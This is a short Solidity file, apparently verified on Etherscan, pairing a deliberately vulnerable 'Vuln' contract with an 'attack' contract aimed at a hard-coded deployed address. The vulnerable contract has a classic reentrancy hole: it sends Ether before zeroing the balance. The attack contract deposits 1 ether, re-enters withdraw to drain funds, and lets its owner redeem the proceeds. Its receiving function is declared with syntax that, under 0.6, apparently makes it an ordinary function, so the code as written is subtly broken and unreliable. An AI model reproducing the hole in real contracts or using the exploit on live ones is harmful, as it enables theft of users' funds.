/**
 *Submitted for verification at Etherscan.io on 2022-12-08
*/

pragma solidity ^0.6.0;
contract Vuln {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // Refund their balance
        msg.sender.call.value(balances[msg.sender])("");

        // Set their balance to 0
        balances[msg.sender] = 0;
    }
}


contract attack {
    Vuln vuln = Vuln(address(0xEB81D9a87BbbBf4066be04AdDaDbF03410F1F58d));
    address owner;

    constructor() public {
        owner = msg.sender;
    }

    function fallback() external payable {
        if (address(this).balance <= 1 ether) {
            vuln.withdraw();
        }
    }

    function attackFunc() public {
        vuln.deposit.value(1 ether)();
        vuln.withdraw();
    }

    function redeem() public {
        require(msg.sender == owner);
        msg.sender.transfer(address(this).balance);
    }
}